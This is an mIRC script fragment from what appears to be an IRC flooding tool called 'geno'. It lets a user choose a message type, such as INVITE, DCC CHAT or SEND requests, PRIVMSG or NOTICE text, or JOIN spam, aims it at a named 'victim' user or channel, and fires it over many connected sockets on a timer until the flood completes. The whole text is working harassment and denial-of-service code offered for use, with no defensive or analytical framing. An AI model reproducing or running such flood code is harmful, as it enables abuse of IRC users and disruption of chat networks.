   alias -l task {
     if ($dialog(geno) == $null) && ($window(@HARDCORE) == $null ) { .timergeno* off | .timertask off | sockclose identd.geno* | unset %geno* | sockclose geno* | return }
     if ($dialog(geno) != $null) { did -a geno 59 $str(0, $calc( 3 - $len($sock(geno.irc*,0))))) $+ $sock(geno.irc*,0)  $+ $chr(47)  $+  $str(0,$calc( 3 - $len($sock(geno*,0))))) $+ $calc($sock(geno*,0) - $sock(geno.ip.probe,0))  }
   }
   alias -l flood.set {
     if ($did(geno,31).state == 1) { set %geno.flood.type Invite $1 : $+ $did(geno,15) }
     if ($did(geno,32).state == 1) { set %geno.flood.type PRIVMSG $1 :DCC CHAT chat 0 0  }
     if ($did(geno,33).state == 1) { set %geno.flood.type  PRIVMSG $1 :DCC SEND $replace($did(geno,20), $chr(32) ,_) 0 0 0 }
     if ($did(geno,34).state == 1) { set %geno.flood.type PRIVMSG $1 : $+ $did(geno,21) }
     if ($did(geno,35).state == 1) { set %geno.flood.type  NOTICE $1 : $+ $did(geno,22)  }
     if ($did(geno,36).state == 1) { set %geno.flood.type  PRIVMSG $1 : $+ $did(geno,23) $+   }
     if ($did(geno,37).state == 1) { set %geno.flood.type  NOTICE $1 : $+ $did(geno,24) $+  }
     if ($did(geno,38).state == 1) { set %geno.flood.type  JOIN : $+ $1-  $chr(131)  JOIN $1 : $+ $did(geno,25)  | var %geno.flood.len = $calc($len(ABCD : $+ $1) * 2)   }
     info -Starting Flood-
     if  ($gettok(%geno-victim,1,32) == c) && ($gettok(%geno.flood.type ,1,32) != Join) {
       sockwrite -tn geno.irc* JOIN : [ $+ [ $gettok(%geno-victim,2-,32) ] ]
     }
     info victim\channel: $gettok(%geno-victim,2,32)
     if (%geno.flood.len == $null) { var %geno.flood.len = $len(%geno.flood.type )  }
     .timergeno.flood -o $calc(%geno.FloodX + 2)  $iif($round($calc((%geno.flood.len / 50) * $sock(irc.geno*,0)),0) > 1,$round($calc((%geno.flood.len / 50) * $sock(irc.geno*,0)),0),1) geno.flood
     geno.flood
   }
   alias -l geno.flood {
     if ($sock(geno.irc*,0) == 0) { .timergeno.flood* off | return }
     if ($timer(geno.flood).reps == 2) {  info -Flooding Complete- | flood.halt | return }
     var %tmpt = $iif($round($calc((%geno.flood.len / 50) * $sock(irc.geno*,0)),0) > 1,$round($calc((%geno.flood.len / 50) * $sock(irc.geno*,0)),0),1)
     var %tmpd = $timer(geno.flood).delay
     if (%tmpd > %tmpt) { .timergeno.flood -o $timer(geno.flood).reps %tmpt geno.flood  | geno.flood | return }
     if (%tmpd < %tmpt) { .timergeno.flood [ $+ [ $ticks ] ] -o 1 $calc(%tmpt - %tmpd) geno.flood | .timergeno.flood -o $timer(geno.flood).reps %tmpt geno.flood  }
     sockwrite -tn geno.irc* $gettok(%geno.flood.type,1,131)
     sockwrite -tn geno.irc* $$gettok(%geno.flood.type,2-,131)
   }
